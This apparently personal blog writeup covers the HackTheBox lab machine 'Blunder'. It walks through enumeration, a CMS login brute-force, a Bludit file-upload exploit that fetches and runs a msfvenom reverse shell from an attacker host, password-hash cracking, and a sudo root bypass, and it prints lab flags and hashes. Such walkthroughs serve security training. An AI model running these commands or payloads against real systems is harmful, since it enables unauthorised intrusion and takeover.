<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Blunder | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,linux,easy"><meta name=description content="Blunder HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/blunder/><link crossorigin=anonymous href=/assets/css/stylesheet.c5de734fbd88c3d21543485ffbcb1ccdda89a86a780cf987fa00199c41dbc947.css integrity="sha256-xd5zT72Iw9IVQ0hf+8sczdqJqGp4DPmH+gAZnEHbyUc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/blunder/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Blunder "><meta property="og:description" content="Blunder HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/blunder/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/blunder/blunder.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2020-10-17T17:01:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/blunder/blunder.png"><meta name=twitter:title content="Blunder "><meta name=twitter:description content="Blunder HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"Blunder ","item":"https://s4ch.github.io/writeups/hackthebox/blunder/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Blunder ","name":"Blunder ","description":"Blunder HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","linux","easy"],"articleBody":"Information Name: Blunder Profile: www.hackthebox.eu Difficulty: Easy OS: Linux Points: 20 Overview Install tools used in this WU on BlackArch Linux:\n$ pacman -S nmap ffuf exploitdb cewl metasploit ruby-httpclient ruby-docopt pwncat haiti Network enumeration A nmap scan for port and service discovery:\n# Nmap 7.80 scan initiated Fri Jun 12 13:20:17 2020 as: nmap -sSVC -p- -oA nmap_full 10.10.10.191 Nmap scan report for 10.10.10.191 Host is up (0.11s latency). Not shown: 65533 filtered ports PORT STATE SERVICE VERSION 21/tcp closed ftp 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-generator: Blunder |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Blunder | A blunder of interesting facts Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Jun 12 14:23:47 2020 -- 1 IP address (1 host up) scanned in 3809.57 seconds Let’s add the local domain to /etc/hosts:\n$ cat /etc/hosts| grep bundler 10.10.10.191 bundler.htb HTTP enumeration \u0026 exploitation Let’s start to enumerate pages on the web server with ffuf:\n$ ffuf -u http://bundler.htb/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -e .txt,.html,.php -fc 403 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.2.0-git ________________________________________________ :: Method : GET :: URL : http://bundler.htb/FUZZ :: Wordlist : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt :: Extensions : .txt .html .php :: Follow redirects : true :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 :: Filter : Response status: 403 ________________________________________________ admin [Status: 200, Size: 2385, Words: 106, Lines: 71] install.php [Status: 200, Size: 30, Words: 5, Lines: 1] about [Status: 200, Size: 3280, Words: 225, Lines: 106] 0 [Status: 200, Size: 7561, Words: 794, Lines: 171] robots.txt [Status: 200, Size: 22, Words: 3, Lines: 2] todo.txt [Status: 200, Size: 118, Words: 20, Lines: 5] rev.php [Status: 200, Size: 0, Words: 1, Lines: 1] usb [Status: 200, Size: 3959, Words: 304, Lines: 111] .gitignore [Status: 200, Size: 563, Words: 1, Lines: 28] :: Progress: [153068/153068] :: Job [1/1] :: 105 req/sec :: Duration: [0:24:07] :: Errors: 0 :: I found the following path and files:\n/install.php: Bludit is already installed ;) /admin/: login page where Bludit is also mentioned /robots.txt: nothing much /todo.txt: a bunch of hints, see below /.gitignore: there is maybe a /.git/ folder exposed to dump /todo.txt\n-Update the CMS -Turn off FTP - DONE -Remove old users - DONE -Inform fergus that the new blog needs images - PENDING The website seems to be built with Bludit CMS. If we trust the todo list, it may be up to date, the FTP is off and we saw with the nmap scan that port 21 is closed. Also there must be a user called fergus that may be the admin.\nIt seems the CMS could be exploitable but we don’t know the version we have yet.\n$ searchsploit Bludit --id ---------------------------------------------------------------------------------- --------------------------------- Exploit Title | EDB-ID ---------------------------------------------------------------------------------- --------------------------------- Bludit 3.9.12 - Directory Traversal | 48568 Bludit - Directory Traversal Image File Upload (Metasploit) | 47699 bludit Pages Editor 3.0.0 - Arbitrary File Upload | 46060 ---------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results No need to try to bruteforce on the authentication because there is a brute force protection enabled by default.\nThe current version is 3.13.1, so I looked in the source code on github for this version and tried to see if a file is disclosing it. It seems that some files like bl-plugins/about/metadata.json are leaking the version.\nSo if we look at http://10.10.10.191/bl-plugins/about/metadata.json we obtain the following response:\n{ \"author\": \"Bludit\", \"email\": \"\", \"website\": \"https://plugins.bludit.com\", \"version\": \"3.9.2\", \"releaseDate\": \"2019-06-21\", \"license\": \"MIT\", \"compatible\": \"3.9.2\", \"notes\": \"\" } For example the directory traversal was in 3.9.12 so 3.9.2 must be vulnerable too.\nSo let’s try EDB-48568 now:\n$ searchsploit -p 48568 Exploit: Bludit 3.9.12 - Directory Traversal URL: https://www.exploit-db.com/exploits/48568 Path: /usr/share/exploitdb/exploits/php/webapps/48568.py File Type: Python script, ASCII text executable, with very long lines, with CRLF line terminators $ cp /usr/share/exploitdb/exploits/php/webapps/48568.py . $ python 48568.py ΓòöΓòù Γö¼ Γö¼ Γö¼ΓöîΓö¼ΓöÉΓö¼ΓöîΓö¼ΓöÉ ΓòöΓòÉΓòùΓòª ΓòªΓòöΓòùΓòö ΓòáΓò⌐ΓòùΓöé Γöé Γöé ΓöéΓöéΓöé Γöé ΓòáΓòÉΓò¥ΓòæΓòæΓòæΓòæΓòæΓòæ ΓòÜΓòÉΓò¥Γö┤ΓöÇΓöÿΓööΓöÇΓöÿΓöÇΓö┤ΓöÿΓö┤ Γö┤ Γò⌐ ΓòÜΓò⌐Γò¥Γò¥ΓòÜΓò¥ CVE-2019-16113 CyberVaca usage: 48568.py [-h] -u URL -user USER -pass PASSWORD -c COMMAND 48568.py: error: the following arguments are required: -u, -user, -pass, -c But it seems it’s an authenticated exploit. The MSF upload exploit seems to be authenticated too.\nSo I searched on internet and found some articles talking about bruteforce protection bypass:\nBludit Brute Force Mitigation Bypass Bludit CMS Version 3.9.2 Brute Force Protection Bypass With CeWL let’s build a wordlist based on the words from the website:\n$ cewl -w blunder_wordlist.txt -m 5 http://10.10.10.191 Then we can try to find fergus password via bruteforce. I made an exploit for the Brute Force Mitigation Bypass: Bludit-auth-BF-bypass.\n$ ./exploit.rb -r http://10.10.10.191 -u fergus -w blunder_wordlist.txt [*] Trying password: Plugins [*] Trying password: Include [*] Trying password: About [*] Trying password: Begin [*] Trying password: service [*] Trying password: Stadia [*] Trying password: Dynamic [*] Trying password: blunder [*] Trying password: interesting [*] Trying password: facts [*] Trying password: devices [*] Trying password: Google ... [*] Trying password: RolandDeschain [+] Password found: RolandDeschain Now we can log in and will probably be able to use one of the authenticated exploit.\nLet’s try the msf one:\nmsf5 exploit(linux/http/bludit_upload_images_exec) \u003e options Module options (exploit/linux/http/bludit_upload_images_exec): Name Current Setting Required Description ---- --------------- -------- ----------- BLUDITPASS RolandDeschain yes The password for Bludit BLUDITUSER fergus yes The username for Bludit Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.191 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:' RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes The base path for Bludit VHOST no HTTP server virtual host Payload options (php/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192.168.1.98 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Bludit v3.9.2 msf5 exploit(linux/http/bludit_upload_images_exec) \u003e run [*] Started reverse TCP handler on 192.168.1.98:4444 [+] Logged in as: fergus [*] Retrieving UUID... [*] Uploading ScDPUYvvNY.png... [*] Uploading .htaccess... [*] Executing ScDPUYvvNY.png... [!] This exploit may require manual cleanup of '.htaccess' on the target [*] Exploit completed, but no session was created. But remember we can try the Python PoC, that won’t drop a shell directly but we should be able to execute a command:\n$ python 48568.py -u http://10.10.10.191 -user fergus -pass RolandDeschain -c 'wget http://10.10.14.82:8888' ΓòöΓòù Γö¼ Γö¼ Γö¼ΓöîΓö¼ΓöÉΓö¼ΓöîΓö¼ΓöÉ ΓòöΓòÉΓòùΓòª ΓòªΓòöΓòùΓòö ΓòáΓò⌐ΓòùΓöé Γöé Γöé ΓöéΓöéΓöé Γöé ΓòáΓòÉΓò¥ΓòæΓòæΓòæΓòæΓòæΓòæ ΓòÜΓòÉΓò¥Γö┤ΓöÇΓöÿΓööΓöÇΓöÿΓöÇΓö┤ΓöÿΓö┤ Γö┤ Γò⌐ ΓòÜΓò⌐Γò¥Γò¥ΓòÜΓò¥ CVE-2019-16113 CyberVaca [+] csrf_token: c70c85766c4e397c88528a05f2096ec4b155ccb7 [+] cookie: dvn3jo5f1srsl0in6snh59k346 [+] csrf_token: 1c97c7eab1fadc24b5ac09a593e150c794a19eb7 [+] Uploading oytpsybc.jpg [+] Executing command: wget http://10.10.14.82:8888 [+] Delete: .htaccess [+] Delete: oytpsybc.jpg We can see the connection on our oneline web server:\n$ ruby -run -e httpd . -p 8888 [2020-08-16 20:54:16] INFO WEBrick 1.6.0 [2020-08-16 20:54:16] INFO ruby 2.7.1 (2020-03-31) [x86_64-linux] [2020-08-16 20:54:16] INFO WEBrick::HTTPServer#start: pid=71953 port=8888 10.10.10.191 - - [16/Aug/2020:20:54:53 CEST] \"GET / HTTP/1.1\" 200 2265 - -\u003e / So we can generate a reverse shell with msfvenom (part of msf):\n$ msfvenom -a x64 --platform linux -p linux/x64/shell_reverse_tcp LHOST=10.10.14.82 LPORT=9999 -f elf \u003e revshell.elf No encoder specified, outputting raw payload Payload size: 74 bytes Final size of elf file: 194 bytes Start a listener with pwncat:\n$ pwncat -l 9999 -vv INFO: Listening on :::9999 (family 10/IPv6, TCP) INFO: Listening on 0.0.0.0:9999 (family 2/IPv4, TCP) Upload \u0026 execute our reverse shell:\n$ python 48568.py -u http://10.10.10.191 -user fergus -pass RolandDeschain -c 'wget http://10.10.14.82:8888/revshell.elf \u0026\u0026 chmod +x revshell.elf \u0026\u0026 ./revshell.elf' ΓòöΓòù Γö¼ Γö¼ Γö¼ΓöîΓö¼ΓöÉΓö¼ΓöîΓö¼ΓöÉ ΓòöΓòÉΓòùΓòª ΓòªΓòöΓòùΓòö ΓòáΓò⌐ΓòùΓöé Γöé Γöé ΓöéΓöéΓöé Γöé ΓòáΓòÉΓò¥ΓòæΓòæΓòæΓòæΓòæΓòæ ΓòÜΓòÉΓò¥Γö┤ΓöÇΓöÿΓööΓöÇΓöÿΓöÇΓö┤ΓöÿΓö┤ Γö┤ Γò⌐ ΓòÜΓò⌐Γò¥Γò¥ΓòÜΓò¥ CVE-2019-16113 CyberVaca [+] csrf_token: 1f60ba2db4a30cade52205468c95b5f33e408bc3 [+] cookie: 3a679ict7buj7aqkmff6e132f3 [+] csrf_token: 6c3f1bf1c0455dfabb3c539367629f6cb21298da [+] Uploading ggllqvlr.jpg [+] Executing command: wget http://10.10.14.82:8888/revshell.elf \u0026\u0026 chmod +x revshell.elf \u0026\u0026 ./revshell.elf [+] Delete: .htaccess [+] Delete: ggllqvlr.jpg And we obtain a shell:\nINFO: Client connected from 10.10.10.191:53416 (family 2/IPv4, TCP) which python /usr/bin/python python -c 'import pty;pty.spawn(\"/bin/bash\")' www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ uname -a Linux blunder 5.3.0-53-generic #47-Ubuntu SMP Thu May 7 12:18:16 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ cat /etc/os-release NAME=\"Ubuntu\" VERSION=\"19.10 (Eoan Ermine)\" ID=ubuntu ID_LIKE=debian PRETTY_NAME=\"Ubuntu 19.10\" VERSION_ID=\"19.10\" HOME_URL=\"https://www.ubuntu.com/\" SUPPORT_URL=\"https://help.ubuntu.com/\" BUG_REPORT_URL=\"https://bugs.launchpad.net/ubuntu/\" PRIVACY_POLICY_URL=\"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy\" VERSION_CODENAME=eoan UBUNTU_CODENAME=eoan www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ id uid=33(www-data) gid=33(www-data) groups=33(www-data) Note: it’s possible to do it manually too.\nSystem enumeration Let’s see if there are accounts used by humans:\nwww-data@blunder:/var/www/bludit-3.9.2$ ls -lhA /home total 8.0K drwxr-xr-x 16 hugo hugo 4.0K May 26 09:29 hugo drwxr-xr-x 16 shaun shaun 4.0K Apr 28 12:13 shaun www-data@blunder:/var/www/bludit-3.9.2$ cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:101:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin uuidd:x:106:113::/run/uuidd:/usr/sbin/nologin tcpdump:x:107:114::/nonexistent:/usr/sbin/nologin avahi-autoipd:x:108:115:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin usbmux:x:109:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin rtkit:x:110:116:RealtimeKit,,,:/proc:/usr/sbin/nologin dnsmasq:x:111:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin cups-pk-helper:x:112:119:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin speech-dispatcher:x:113:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false kernoops:x:114:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin saned:x:116:122::/var/lib/saned:/usr/sbin/nologin nm-openvpn:x:117:123:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin whoopsie:x:118:124::/nonexistent:/bin/false colord:x:119:125:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin hplip:x:120:7:HPLIP system user,,,:/var/run/hplip:/bin/false geoclue:x:121:126::/var/lib/geoclue:/usr/sbin/nologin pulse:x:122:127:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin gnome-initial-setup:x:123:65534::/run/gnome-initial-setup/:/bin/false gdm:x:124:129:Gnome Display Manager:/var/lib/gdm3:/bin/false shaun:x:1000:1000:blunder,,,:/home/shaun:/bin/bash systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin hugo:x:1001:1001:Hugo,1337,07,08,09:/home/hugo:/bin/bash temp:x:1002:1002:,,,:/home/temp:/bin/bash user.txt is in hugo’s home folder and shuan maybe be used for pe.\nPrivilege Escalation of Machine : from www-data to hugo Let’s see in the database of the app:\n$ www-data@blunder:/var/www/bludit-3.9.2$ cat bl-content/databases/users.php \u003c?php defined('BLUDIT') or die('Bludit CMS.'); ?\u003e { \"admin\": { \"nickname\": \"Admin\", \"firstName\": \"Administrator\", \"lastName\": \"\", \"role\": \"admin\", \"password\": \"bfcc887f62e36ea019e3295aafb8a3885966e265\", \"salt\": \"5dde2887e7aca\", \"email\": \"\", \"registered\": \"2019-11-27 07:40:55\", \"tokenRemember\": \"\", \"tokenAuth\": \"b380cb62057e9da47afce66b4615107d\", \"tokenAuthTTL\": \"2009-03-15 14:00\", \"twitter\": \"\", \"facebook\": \"\", \"instagram\": \"\", \"codepen\": \"\", \"linkedin\": \"\", \"github\": \"\", \"gitlab\": \"\" }, \"fergus\": { \"firstName\": \"\", \"lastName\": \"\", \"nickname\": \"\", \"description\": \"\", \"role\": \"author\", \"password\": \"be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7\", \"salt\": \"jqxpjfnv\", \"email\": \"\", \"registered\": \"2019-11-27 13:26:44\", \"tokenRemember\": \"\", \"tokenAuth\": \"0e8011811356c0c5bd2211cba8c50471\", \"tokenAuthTTL\": \"2009-03-15 14:00\", \"twitter\": \"\", \"facebook\": \"\", \"codepen\": \"\", \"instagram\": \"\", \"github\": \"\", \"gitlab\": \"\", \"linkedin\": \"\", \"mastodon\": \"\" } The password seems to be stored as a salted SHA1 hash, we can tell with :\n$ haiti bfcc887f62e36ea019e3295aafb8a3885966e265 SHA-1 [HC: 100] [JtR: raw-sha1] Double SHA-1 [HC: 4500] RIPEMD-160 [HC: 6000] [JtR: ripemd-160] Haval-160 Tiger-160 HAS-160 LinkedIn [HC: 190] [JtR: raw-sha1-linkedin] Skein-256(160) Skein-512(160) Those two users won’t help us because admin doesn’t have a system account \u0026 we already have fergus that doesn’t have a system account too.\nBut look, there is another bludit version:\nwww-data@blunder:/var/www$ ls bludit-3.10.0a bludit-3.9.2 html In the other version the user database contains hugo, a user that is on the system, so we have soem chance the account re-use the same password.\nwww-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php \u003c?php defined('BLUDIT') or die('Bludit CMS.'); ?\u003e { \"admin\": { \"nickname\": \"Hugo\", \"firstName\": \"Hugo\", \"lastName\": \"\", \"role\": \"User\", \"password\": \"faca404fd5c0a31cf1897b823c695c85cffeb98d\", \"email\": \"\", \"registered\": \"2019-11-27 07:40:55\", \"tokenRemember\": \"\", \"tokenAuth\": \"b380cb62057e9da47afce66b4615107d\", \"tokenAuthTTL\": \"2009-03-15 14:00\", \"twitter\": \"\", \"facebook\": \"\", \"instagram\": \"\", \"codepen\": \"\", \"linkedin\": \"\", \"github\": \"\", \"gitlab\": \"\"} } And this time no salt it used. So let’s try the hash on CrackStation.\nThe password is: Password120.\nwww-data@blunder:/var/www$ su hugo Password: hugo@blunder:~$ cat user.txt 9b8099236a4c7efcad6bf60293d921e5 hugo@blunder:~$ id uid=1001(hugo) gid=1001(hugo) groups=1001(hugo) Privilege Escalation of Machine : from hugo to root We can launch a bash shell as any user except root:\nhugo@blunder:~$ sudo -l Password: Matching Defaults entries for hugo on blunder: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User hugo may run the following commands on blunder: (ALL, !root) /bin/bash But that’s in theory, because we can use sudo \u003c 1.8.28 - Security Bypass (CVE-2019-14287), see EDB-47502.\nhugo@blunder:~$ sudo --version sudo --version Sudo version 1.8.25p1 Sudoers policy plugin version 1.8.25p1 Sudoers file grammar version 46 Sudoers I/O plugin version 1.8.25p1 hugo@blunder:~$ sudo -u#-1 /bin/bash root@blunder:/home/hugo# id uid=0(root) gid=1001(hugo) groups=1001(hugo) root@blunder:/# cat /root/root.txt df815831c59461a89906cac16c662282 root@blunder:/# cat /etc/shadow | grep root root:$6$GmdDkez55tk.8Dvd$qDfa.WwHrKSBCswEaWLaSwFNCeNroew0pyxbsg8uO8a2/uq.XelP9Q/u5Cb9cBxO6hSyaVqt1lfU.3omw0ThC0:18228:0:99999:7::: I wonder if there was a way to root via the shuan account.\n:\n","wordCount":"1946","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/blunder/blunder.png","datePublished":"2020-10-17T17:01:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/blunder/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/archives title=Blog><span>Blog</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Blunder</h1><div class=post-description>Blunder HackTheBox writeup</div><div class=post-meta><span title='2020-10-17 17:01:00 +0000 UTC'>October 17, 2020</span>&nbsp;·&nbsp;10 min&nbsp;·&nbsp;1946 words&nbsp;·&nbsp;s4ch</div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/blunder/blunder.png alt="Blunder HackTheBox Machine"><p>Blunder - Easy Linux Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network enumeration</a></li><li><a href=#http-enumeration--exploitation>HTTP enumeration & exploitation</a></li><li><a href=#system-enumeration>System enumeration</a></li><li><a href=#privilege-escalation-of-machine--from-www-data-to-hugo>Privilege Escalation of Machine : from www-data to hugo</a></li><li><a href=#privilege-escalation-of-machine--from-hugo-to-root>Privilege Escalation of Machine : from hugo to root</a></li></ul></nav></div></details></div><div class=post-content><h1 id=information>Information<a hidden class=anchor aria-hidden=true href=#information>#</a></h1><ul><li><strong>Name:</strong> Blunder</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/254>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Easy</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 20</li></ul><h2 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h2><p>Install tools used in this WU on BlackArch Linux:</p><pre tabindex=0><code>$ pacman -S nmap ffuf exploitdb cewl metasploit ruby-httpclient ruby-docopt pwncat haiti
</code></pre><h2 id=network-enumeration>Network enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h2><p>A <a href=https://nmap.org/>nmap</a> scan for port and service discovery:</p><pre tabindex=0><code># Nmap 7.80 scan initiated Fri Jun 12 13:20:17 2020 as: nmap -sSVC -p- -oA nmap_full 10.10.10.191
Nmap scan report for 10.10.10.191
Host is up (0.11s latency).
Not shown: 65533 filtered ports
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun 12 14:23:47 2020 -- 1 IP address (1 host up) scanned in 3809.57 seconds
</code></pre><p>Let&rsquo;s add the local domain to <code>/etc/hosts</code>:</p><pre tabindex=0><code>$ cat /etc/hosts| grep bundler
10.10.10.191 bundler.htb
</code></pre><h2 id=http-enumeration--exploitation>HTTP enumeration & exploitation<a hidden class=anchor aria-hidden=true href=#http-enumeration--exploitation>#</a></h2><p>Let&rsquo;s start to enumerate pages on the web server with <a href=https://github.com/ffuf/ffuf>ffuf</a>:</p><pre tabindex=0><code>$ ffuf -u http://bundler.htb/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -e .txt,.html,.php -fc 403

        /&#39;___\  /&#39;___\           /&#39;___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.2.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://bundler.htb/FUZZ
 :: Wordlist         : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt
 :: Extensions       : .txt .html .php
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response status: 403
________________________________________________

admin                   [Status: 200, Size: 2385, Words: 106, Lines: 71]
install.php             [Status: 200, Size: 30, Words: 5, Lines: 1]
about                   [Status: 200, Size: 3280, Words: 225, Lines: 106]
0                       [Status: 200, Size: 7561, Words: 794, Lines: 171]
robots.txt              [Status: 200, Size: 22, Words: 3, Lines: 2]
todo.txt                [Status: 200, Size: 118, Words: 20, Lines: 5]
rev.php                 [Status: 200, Size: 0, Words: 1, Lines: 1]
usb                     [Status: 200, Size: 3959, Words: 304, Lines: 111]
.gitignore              [Status: 200, Size: 563, Words: 1, Lines: 28]
